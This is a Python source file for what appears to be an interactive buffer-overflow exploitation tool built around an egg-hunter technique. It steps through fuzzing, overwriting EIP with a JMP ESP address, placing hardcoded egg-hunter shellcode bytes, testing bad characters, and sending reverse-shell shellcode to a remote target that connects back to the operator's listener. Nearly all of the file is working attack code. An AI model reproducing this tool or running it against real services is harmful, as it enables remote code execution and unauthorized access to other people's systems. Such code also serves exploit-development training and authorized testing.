import binascii
import logging
import subprocess
import sys
from struct import pack

from protocols.http import Http
from utils.hex import HexUtil
from utils.system import System


class EggHunter:

    config = ""
    offset = 0
    overflow = 0

    buffer = ""
    def __init__(self, config):
        self.config = config

        return None

    #################################
    # EggHunter Attributes

    # offset = 1
    # eip = "B" * 4
    # esp = "C" * 4
    # payload = "D" * 400
    # nops = 0
    # jmpesp_add = ""
    # instruction = ""  # "\xeb\xca" #jmp short
    # hunter = ""
    # egg = "T00WT00W"
    # src_address = ""
    # dest_address = ""
    # shellcode = ""

    #################################
    # EggHunter Exploit Method

    def stack_fill(self, sendHunter):

        # print("[+] Filling stack at " + str(offset))

        _hunter_begin = "\x90" * 4
        self.hunter = "\x66\x81\xca\xff\x0f\x42\x52\x6a\x02\x58\xcd\x2e\x3c\x05\x5a\x74"
        self.hunter += "\xef\xb8\x54\x30\x30\x57\x8b\xfa\xaf\x75\xea\xaf\x75\xe7\xff\xe7"
        _hunter_end = "\x90" * 4  # 4 bytes is lost when hunter iniates

        if(sendHunter != False):
            _hunter = _hunter_begin + self.hunter + _hunter_end
            _offset = "A" * (self.config.offset - len(_hunter)) + _hunter
        else:
            _offset = "A" * self.config.offset

        if self.config.jmpesp_add != "":
            _eip = pack('<L', int("0x" + self.config.jmpesp_add, 16))
        else:
            _eip = "B" * 4

        if self.config.instruction != "":
            _esp = self.config.instruction
        else:
            _esp = "C" * 4

        buffer = _offset + _eip + _esp
        # buffer += "\r\n"

        self.config.shellcode = self.config.egg + self.config.payload

        return buffer


    def exploit(self):

        try:
            adapter = System.get_adapter(self.config)

            inject_func = getattr(adapter, 'inject')

            if(self.config.offset < 1 or self.config.offset == ""):
                System.generic_fuzzer(self.config)

            # self.offset = System.input("[?] Press ENTER if you wanna fuzz the application or input the offset to skip this:")
            # if (self.offset != ""):
            #     self.offset = int(self.offset)
            # else:
            #     self.offset = 0
            #
            # if (self.overflow == 0 and self.offset == 0):
            #     self.overflow = fuzzer_func(self.config.remoteip, self.config.remoteport, self.config.field, 100, 100)
            #
            #     print("!" * 100)
            #     print("[*] Application crashed at %s bytes" % self.overflow)
            #
            # if (self.offset == 0 and self.overflow > 0):
            #     print("[*] Generating pattern: msf-pattern_create -l %s" % self.overflow)
            #
            #     # print subprocess.check_output(['msf-pattern_create', '-l', str(crash)])
            #     # python3
            #     # result = subprocess.run(['msf_pattern-create', crash], stdout=subprocess.PIPE)
            #     # result.stdout
            #
            #     buffer = subprocess.check_output(['msf-pattern_create', '-l', str(self.overflow)]).strip()
            #
            #     gonext = System.input("[?] Press ENTER when you wanna give the shot!!! This will send the PATTERN imediately!!!")
            #
            #     # print(buffer);
            #
            #     inject_func(self.config.remoteip, self.config.remoteport, self.config.field, buffer, True)
            #     print("[*] Buffer Injected " + str(len(buffer)) + " bytes to get OFFSET!!!")
            #     eip_address = System.input("[?] Check the target debugger and enter EIP Value :")
            #
            #     _offset = subprocess.check_output(['msf-pattern_offset', '-q', str(self.eip_address)])
            #     _offset = _offset.split('offset ')
            #
            #     self.offset = int(_offset[len(_offset) - 1].strip())

            buffer = self.stack_fill(False)
            print("[+] Buffer is aligned in EIP:")
            print(buffer);

            #########################################################
            # GET JMP ADDRESS

            if(self.config.jmpesp_add == ""):

                _jmpesp_add = System.input("[?] Inform JMP ESP address or leave blank to continue:")

                if (_jmpesp_add == ""):
                    gonext = System.input(
                        "[!] All set! Press ENTER when your application is ready to receive a crafted buffer in EIP :")

                    inject_func(self.config.remoteip, self.config.remoteport, self.config.field, buffer, True)
                    print("[*] Buffer Injected (" + str(len(buffer)) + " bytes) to get JMP ESP!!!")

                    print("[!] Hint: !mona jmp -r esp -n")
                    self.config.jmpesp_add = System.input("[?] Check the target debugger and enter JMP ESP Address :")

                if (self.config.mode == "http"):
                    buffer = adapter.make_request(self.config.remoteip, self.config.remoteport, self.config.field, self.stack_fill(False),
                                                  self.shellcode, self.offset)
                else:
                    buffer = self.stack_fill(False)

                gonext = System.input("[!] All set! Do you wanna test the JMP ESP in EIP? [Y/n]:")

                if(gonext.upper() == "Y"):
                    inject_func(self.config.remoteip, self.config.remoteport, self.config.field, buffer, True)
                    print("[+] Buffer Injected (" + str(len(buffer)) + " bytes) to test STACK FILLING!!!")
            else:
                print("[!] JMP ESP Address reload from previous sessions:" + self.config.jmpesp_add)

            #########################################################
            # EGG HUNTING

            # _egg = System.input("[?] Custom egg ? [Default: T00WT00W]")
            #
            # if(_egg != self.config.egg):
            #     self.config.egg = _egg
            #     self.config.hunter = System.input("[?] Change default EggHunter : ")

            gonext = System.input("[?] Do you wanna test the EggHunter ? [Y/n]")
            if (gonext.upper() == "Y"):
                if (self.config.mode == "http"):
                    buffer = adapter.make_request(self.config.remoteip, self.config.remoteport, self.config.field,
                                                  self.stack_fill(True), self.config.shellcode, self.config.offset)
                else:
                    buffer = self.stack_fill(True)

                gonext = System.input("[!] All set! Press ENTER when your application is ready to receive an egg in program's memory :")

                inject_func(self.config.remoteip, self.config.remoteport, self.config.field, buffer, True)
                print("[+] Buffer Injected (" + str(len(buffer)) + " bytes) to test EGG position!!!")
                print("[!] Hint: !mona find -s T00W")
                print("[!] Hint: !mona egg -t T00W")

            #########################################################
            # OP CODES FOR JUMPING BACK

            if (self.config.dest_address == "" and self.config.src_address == ""):
                _src_address = System.input("[?] Enter the CCCC address :")
                _dest_address = System.input("[?] Enter the destination address :")

                try:
                    self.config.src_address = int("0x" + _src_address, 16)
                    self.config.dest_address = int("0x" + _dest_address, 16)

                    diff = hex(self.config.src_address - self.config.dest_address)
                except Exception as err:
                    print(str(err))

            _instruction = System.input("[?] Enter the negative jmp short OPCODE for " + str(diff) + " (Hint: msf-nasm_shell> jmp short -" + str(diff) + ") : ")
            self.config.instruction = binascii.unhexlify(_instruction)

            _instruction = HexUtil.hex_string_format(_instruction)
            gonext = System.input("[?] Do you wanna test the OPCODE " + _instruction + " ? [Y/n]")

            if (gonext.upper() == "Y"):
                gonext = System.input(
                    "[!] All set! Press ENTER when your application is ready to receive the OPCODE in stack :")

                if (self.config.mode == "http"):
                    buffer = adapter.make_request(self.config.remoteip, self.config.remoteport, self.config.field,
                                                  self.stack_fill(True), self.config.shellcode, self.config.offset)
                else:
                    buffer = self.stack_fill(True)

                inject_func(self.config.remoteip, self.config.remoteport, self.config.field, buffer, True)

            #########################################################
            # BADCHARS

            gonext = System.input("[?] Do you want to test or add custom badchars? [T]est/[A]dd/[S]kip]")

            if(gonext.upper() == "T"):
                self.config.shellcode = System.bytearray
                exploit = self.stack_fill(True)

                System.input("[?] Press any key when you wanna send the bytearray !!!")
                inject_func(self.config.remoteip, self.config.remoteport, self.config.field, exploit, True)

            if(gonext.upper() != "S"):
                bads = System.input("[+] Badchars detected : " + ",".join(System.badchars) + " Additional Badchars? Separate multiple HEX (without 0x) by commas: ")

                if ',' in bads:
                    _bads = bads.split(',')
                    for _badchar in _bads:
                        System.badchars.append(r'\x' + _badchar)
                elif bads != "":
                    System.badchars.append(r'\x' + bads)

                self.config.badchars = System.badchars

            #########################################################
            # SHELLCODE

            print("[!] Preparing Shellcode for reverse shell.....")

            self.config.payload = System.shellcode(self.config.localip, self.config.localport, System.badchars, self.config.platform)

            exploit = self.stack_fill(True)

            resume = System.input("[?] Press any key when you wanna give the shot!!! This will send the FINAL PAYLOAD now!!!")

            if (self.config.mode == "http"):
                buffer = adapter.make_request(self.config.remoteip, self.config.remoteport, self.config.field, exploit, self.config.shellcode, self.config.offset)
            else:
                buffer = self.stack_fill(True)

            inject_func(self.config.remoteip, self.config.remoteport, self.config.field, buffer, True)
            print("[*] Buffer Injected (" + str(len(exploit)) + " bytes)!!!")
            print("[*] Check your listener!!!")

        except Exception as err:
            logging.exception(err)
            sys.exit(2)
